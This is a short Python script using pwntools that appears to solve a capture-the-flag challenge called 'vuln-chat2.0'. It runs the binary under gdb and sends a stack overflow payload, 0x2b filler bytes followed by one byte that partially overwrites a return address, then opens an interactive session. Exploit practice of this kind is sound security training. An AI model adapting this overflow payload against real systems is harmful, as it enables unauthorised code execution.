from pwn import *

target = process('./vuln-chat2.0')
gdb.attach(target, gdbscript='b *0x08048603')

payload = b'\x30' * 0x2b
payload += b'\x72'

target.sendline("lala")
target.recvuntil("lala: ")
target.send(payload)

target.interactive()